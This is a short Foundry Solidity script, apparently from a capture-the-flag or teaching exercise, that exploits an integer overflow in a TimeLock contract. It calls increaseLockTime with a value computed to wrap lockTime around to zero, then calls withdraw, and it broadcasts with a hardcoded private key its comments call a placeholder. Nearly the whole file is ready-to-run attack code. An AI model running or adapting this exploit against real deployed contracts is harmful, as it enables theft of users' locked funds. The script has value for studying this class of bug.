// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Script.sol";
import "../src/TimeLock.sol";


contract ExploitTimeLock is Script {
    TimeLock public timelock;
    //Setup public setup;

    function run() external {
        // Placeholder values - replace with actual contract address and private key
        address timeLockAddress = 0xd3e696E1C4B5313F1CB8ec025Af3edCe731dC306; // Replace with deployed TimeLock contract address
        uint256 privateKey = 0x779a7bcacd318867faf917cac65ec8bf9c4acba9a00d16859faa3334e6dad96b; //replace with actuall private key, this is just a placeholder and is not actually a private key belonging to any entity

        // Start broadcast with the private key
        vm.startBroadcast(privateKey);

        // Interact with the deployed TimeLock contract
        timelock = TimeLock(payable(timeLockAddress));

        // Simulate increasing lock time to trigger overflow
        timelock.increaseLockTime(type(uint256).max - timelock.lockTime() + 1);

        // Withdraw funds after bypassing lock time check
        timelock.withdraw();

        // Stop the broadcast
        vm.stopBroadcast();
    }
}